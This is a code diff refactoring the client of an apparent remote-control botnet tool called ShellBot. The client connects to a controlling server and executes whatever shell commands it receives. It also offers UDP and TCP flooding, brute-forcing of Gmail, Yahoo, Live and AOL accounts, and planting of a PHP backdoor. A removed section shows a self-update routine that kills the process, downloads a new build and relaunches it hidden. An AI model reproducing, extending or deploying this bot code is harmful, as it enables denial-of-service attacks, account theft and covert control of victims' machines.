@@ -34,19 +34,6 @@ import tempfile
 import socket
 import re
 
-if len(sys.argv) == 3:
-    host = sys.argv[1]
-    port = int(sys.argv[2])
-else:
-    # Comment the below line and uncomment the next two for a pre-packaged client.
-    #sys.exit("Usage: client.py <server ip> <server port>")
-    print("Usage: client.py <server ip> <server port>")
-    host = '127.0.0.1'
-    port = 9999
-    print("Using default values - {}:{}".format(host, port))
-
-frozen = getattr(sys, 'frozen', False)
-
 # Used by the Bruteforcer
 def product(*args, **kwds):
     pools = list(map(tuple, args)) * kwds.get('repeat', 1)
@@ -63,47 +50,6 @@ def repeat(obj, times=None):
     else:
         for _ in range(times):
             yield obj
-
-# Self Update
-temporary = """\
-#!/usr/bin/env python3
-import os, sys, urllib.request, tempfile
-
-def getURL(owner, repo, name):
-    import json
-
-    response = urllib.request.urlopen('https://api.github.com/repos/%s/%s/releases/latest'%(owner, repo))
-
-    json_val = json.loads(response.read().decode())
-
-    for file in json_val['assets']:
-        if name == file['name']: return file['browser_download_url']
-
-def download(url, file):
-    import shutil
-
-    with urllib.request.urlopen(url) as response, open(file, 'wb') as out_file:
-        shutil.copyfileobj(response, out_file)
-
-if sys.platform == "win32": os.system("taskkill /F /T /PID {pid}")
-else: os.system("kill {pid}")
-
-if {frozen}:
-    url = getURL('sayak-brm', 'ShellBot', 'client.exe')
-    download(url, r"{exe}")
-else:
-    url = getURL('sayak-brm', 'ShellBot', 'client.py')
-    download(url, r"{arg}")
-
-if sys.platform == "win32":
-    if {frozen}: os.system(r"{exe} {host} {port}")
-    else:
-        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
-        with open(tempfile.gettempdir() + r"/runner.vbs", "w") as f: f.write(runner)
-        os.system(tempfile.gettempdir() + r'/runner.vbs "{exe} {arg} {host} {port}"')
-else: os.system(r"nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
-""".format(pid=os.getpid(), frozen=frozen, host=host,
-           port=port, exe=sys.executable, arg=sys.argv[0])
 
 def selfUpdate():
     while 1:
@@ -564,6 +510,169 @@ def tcpUnleach(victimip, victimport):
     for thread in threads:
         thread.join()
 
+def interact(s, command):
+    commands = command.split()
+    if len(commands) == 0: return
+    if commands[0] == "cd":
+        try:
+            os.chdir(commands[1])
+            s.send(bytes(os.getcwd(), 'utf-8'))
+            print("[INFO] Changed dir to %s" % os.getcwd())
+        except FileNotFoundError:
+            s.send(bytes('[CLIENT - ERROR] Directory missing\n'
+                         + commands[1], 'utf-8'))
+            print("[INFO] %s directory not found" % os.getcwd())
+    elif commands[0] == "selfupdateall":
+        selfUpdate()
+        return None
+    elif commands[0] == "setbackdoor":
+        try:
+            debackdoor(commands[1])
+            s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Wrong arguments\n",
+                         'utf-8'))
+    elif commands[0] == "rmbackdoor":
+        try:
+            rmbackdoor(commands[1])
+            s.send(bytes("[CLIENT] Malicious PHP Removed\n",
+                         'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Wrong arguments\n",
+                         'utf-8'))
+    elif commands[0] == "udpflood":
+        try:
+            udpinfo = commands[1].split(":")
+            t = threading.Thread(None, udpUnleach, None,
+                                 (udpinfo[0], udpinfo[1]))
+            t.start()
+            s.send(bytes("[CLIENT] Flooding started\n",
+                         'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Failed to start Flooding\n",
+                         'utf-8'))
+            pass
+    elif commands[0] == "udpfloodall":
+        try:
+            udpinfo = commands[1].split(":")
+            t = threading.Thread(None, udpUnleach, None,
+                                 (udpinfo[0], udpinfo[1]))
+            t.start()
+        except:
+            pass
+    elif commands[0] == "tcpflood":
+        try:
+            tcpinfo = commands[1].split(":")
+            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
+                                                          tcpinfo[1]))
+            t.start()
+            s.send(bytes("[INFO] Flooding started\n",
+                         'utf-8'))
+        except:
+            s.send(bytes("[ERROR] Failed to start Flooding\n",
+                         'utf-8'))
+    elif commands[0] == "tcpfloodall":
+        try:
+            tcpinfo = commands[1].split(":")
+            t = threading.Thread(None, tcpUnleach, None,
+                                 (tcpinfo[0], tcpinfo[1]))
+            t.start()
+        except:
+            pass
+    elif commands[0] == "gmailbruteforce":
+        try:
+            bruteinfo = commands[1].split(":")
+            t = threading.Thread(None, gmailbruteforce, None,
+                                 (bruteinfo[0], bruteinfo[1],
+                                  bruteinfo[2], bruteinfo[3]))
+            t.start()
+            s.send(bytes("[CLIENT] Bruteforcing started\n",
+                         'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Wrong arguments\n",
+                         'utf-8'))
+    elif commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]:
+        try:
+            popularbruteforce(commands)
+            s.send(bytes("[CLIENT] Bruteforcing started\n",
+                         'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Wrong arguments\n",
+                         'utf-8'))
+    elif commands[0] == "custombruteforce":
+        try:
+            bruteinfo = commands[1].split(":")
+            t = threading.Thread(None, custombruteforce, None,
+                                 (bruteinfo[0], bruteinfo[1],
+                                  bruteinfo[2], bruteinfo[3],
+                                  bruteinfo[4], bruteinfo[5]))
+            t.start()
+            s.send(bytes("[CLIENT] Bruteforcing started\n",
+                            'utf-8'))
+        except:
+            s.send(bytes("[CLIENT] Wrong arguments\n",
+                            'utf-8'))
+    elif commands[0] == "hellows123":
+        s.send(bytes(os.getcwd(), 'utf-8'))
+    elif commands[0] == "quit":
+        s.close()
+        print("[INFO] Connection Closed")
+        return True
+    elif commands[0] == "rawexec":
+        print("[INFO] Spawning {}".format(commands[1]))
+        sem1 = threading.Semaphore()
+        sem2 = threading.Semaphore()
+        sem1.acquire(False)
+        sem2.acquire(False)
+        p = subprocess.Popen(' '.join(commands[1:]), shell=True,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT,
+                                stdin=subprocess.PIPE)
+        sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
+        recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
+        sender.daemon = True
+        recver.daemon = True
+        sender.start()
+        recver.start()
+        p.wait()
+        sem1.release()
+        sem2.release()
+        while threading.active_count() > 1:
+            pass
+        s.send(bytes('stop', 'utf-8'))
+    else:
+        thecommand = ' '.join(commands)
+        pipe = subprocess.PIPE
+        comm = subprocess.Popen(thecommand, shell=True,
+                                stdout=pipe, stderr=pipe,
+                                stdin=pipe)
+        try:
+            STDOUT, STDERR = comm.communicate(timeout=30)
+            en_STDERR = STDERR.decode()
+            en_STDOUT = STDOUT.decode()
+            if en_STDERR == "":
+                if en_STDOUT != "":
+                    print(en_STDOUT)
+                    s.send(bytes(en_STDOUT, 'utf-8'))
+                else:
+                    s.send(bytes("[CLIENT] Command Executed",
+                                    'utf-8'))
+            else:
+                print(en_STDERR)
+                s.send(bytes(en_STDERR, 'utf-8'))
+        except subprocess.TimeoutExpired:
+            comm.terminate()
+            comm.kill()
+            s.send(bytes("[CLIENT] Command Timed Out\n",
+                            'utf-8'))
+            STDOUT, STDERR = comm.communicate()
+            en_STDERR = STDERR.decode()
+            en_STDOUT = STDOUT.decode()
+            if en_STDERR == "":
+                if en_STDOUT != "":
+                    print(en_STDOUT)
+                    s.send(bytes(en_STDOUT, 'utf-8'))
+
 def main(host, port):
     while 1:
         connected = False
@@ -582,167 +691,7 @@ def main(host, port):
                 print(msg)
                 allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                 for onebyone in allofem:
-                    commands = onebyone.split()
-                    if len(commands)==0: continue
-                    if commands[0] == "cd":
-                        try:
-                            os.chdir(commands[1])
-                            s.send(bytes(os.getcwd(), 'utf-8'))
-                            print("[INFO] Changed dir to %s" % os.getcwd())
-                        except FileNotFoundError:
-                            s.send(bytes('[CLIENT - ERROR] Directory missing\n'
-                                         + commands[1], 'utf-8'))
-                            print("[INFO] %s directory not found" % os.getcwd())
-                    elif commands[0] == "selfupdateall":
-                        selfUpdate()
-                        return None
-                    elif commands[0] == "setbackdoor":
-                        try:
-                            debackdoor(commands[1])
-                            s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif commands[0] == "rmbackdoor":
-                        try:
-                            rmbackdoor(commands[1])
-                            s.send(bytes("[CLIENT] Malicious PHP Removed\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif commands[0] == "udpflood":
-                        try:
-                            udpinfo = commands[1].split(":")
-                            t = threading.Thread(None, udpUnleach, None,
-                                                 (udpinfo[0], udpinfo[1]))
-                            t.start()
-                            s.send(bytes("[CLIENT] Flooding started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Failed to start Flooding\n",
-                                         'utf-8'))
-                            pass
-                    elif commands[0] == "udpfloodall":
-                        try:
-                            udpinfo = commands[1].split(":")
-                            t = threading.Thread(None, udpUnleach, None, (udpinfo[0],
-                                                                          udpinfo[1]))
-                            t.start()
-                        except:
-                            pass
-                    elif commands[0] == "tcpflood":
-                        try:
-                            tcpinfo = commands[1].split(":")
-                            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
-                                                                          tcpinfo[1]))
-                            t.start()
-                            s.send(bytes("[INFO] Flooding started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[ERROR] Failed to start Flooding\n",
-                                         'utf-8'))
-                    elif commands[0] == "tcpfloodall":
-                        try:
-                            tcpinfo = commands[1].split(":")
-                            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
-                                                                          tcpinfo[1]))
-                            t.start()
-                        except:
-                            pass
-                    elif commands[0] == "gmailbruteforce":
-                        try:
-                            bruteinfo = commands[1].split(":")
-                            t = threading.Thread(None, gmailbruteforce, None,
-                                                 (bruteinfo[0], bruteinfo[1],
-                                                  bruteinfo[2], bruteinfo[3]))
-                            t.start()
-                            s.send(bytes("[CLIENT] Bruteforcing started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]:
-                        try:
-                            popularbruteforce(commands)
-                            s.send(bytes("[CLIENT] Bruteforcing started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif commands[0] == "custombruteforce":
-                        try:
-                            bruteinfo = commands[1].split(":")
-                            t = threading.Thread(None, custombruteforce, None,
-                                                 (bruteinfo[0], bruteinfo[1],
-                                                  bruteinfo[2], bruteinfo[3],
-                                                  bruteinfo[4], bruteinfo[5]))
-                            t.start()
-                            s.send(bytes("[CLIENT] Bruteforcing started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif commands[0] == "hellows123":
-                        s.send(bytes(os.getcwd(), 'utf-8'))
-                    elif commands[0] == "quit":
-                        s.close()
-                        print("[INFO] Connection Closed")
-                        break
-                    elif commands[0] == "rawexec":
-                        print("[INFO] Spawning {}".format(commands[1]))
-                        sem1 = threading.Semaphore()
-                        sem2 = threading.Semaphore()
-                        sem1.acquire(False)
-                        sem2.acquire(False)
-                        p = subprocess.Popen(' '.join(commands[1:]), shell=True,
-                                             stdout=subprocess.PIPE,
-                                             stderr=subprocess.STDOUT,
-                                             stdin=subprocess.PIPE)
-                        sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
-                        recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
-                        sender.daemon = True
-                        recver.daemon = True
-                        sender.start()
-                        recver.start()
-                        p.wait()
-                        sem1.release()
-                        sem2.release()
-                        while threading.active_count() > 1:
-                            pass
-                        s.send(bytes('stop', 'utf-8'))
-                    else:
-                        thecommand = ' '.join(commands)
-                        pipe = subprocess.PIPE
-                        comm = subprocess.Popen(thecommand, shell=True,
-                                                stdout=pipe, stderr=pipe,
-                                                stdin=pipe)
-                        try:
-                            STDOUT, STDERR = comm.communicate(timeout=30)
-                            en_STDERR = STDERR.decode()
-                            en_STDOUT = STDOUT.decode()
-                            if en_STDERR == "":
-                                if en_STDOUT != "":
-                                    print(en_STDOUT)
-                                    s.send(bytes(en_STDOUT, 'utf-8'))
-                                else:
-                                    s.send(bytes("[CLIENT] Command Executed",
-                                                 'utf-8'))
-                            else:
-                                print(en_STDERR)
-                                s.send(bytes(en_STDERR, 'utf-8'))
-                        except subprocess.TimeoutExpired:
-                            comm.terminate()
-                            comm.kill()
-                            s.send(bytes("[CLIENT] Command Timed Out\n",
-                                         'utf-8'))
-                            STDOUT, STDERR = comm.communicate()
-                            en_STDERR = STDERR.decode()
-                            en_STDOUT = STDOUT.decode()
-                            if en_STDERR == "":
-                                if en_STDOUT != "":
-                                    print(en_STDOUT)
-                                    s.send(bytes(en_STDOUT, 'utf-8'))
+                    if interact(s, onebyone): break
             except KeyboardInterrupt:
                 s.close()
                 print("[INFO] Connection Closed")
@@ -753,7 +702,24 @@ def main(host, port):
                       "\n", __import__('traceback').print_exc())
                 break
 
-while 1:
+while True:
+    if len(sys.argv) == 3:
+        host = sys.argv[1]
+        port = int(sys.argv[2])
+    else:
+        # Comment the below line and uncomment the next two for a pre-packaged client.
+        #sys.exit("Usage: client.py <server ip> <server port>")
+        print("Usage: client.py <server ip> <server port>")
+        host = '127.0.0.1'
+        port = 9999
+        print("Using default values - {}:{}".format(host, port))
+
+    frozen = getattr(sys, 'frozen', False)
+
+    temporary = open('selfUpdate.py', mode='r').read()\
+                     .format(pid=os.getpid(), frozen=frozen, host=host,
+                             port=port, exe=sys.executable, arg=sys.argv[0])
+
     try:
         main(host, port)
     except:
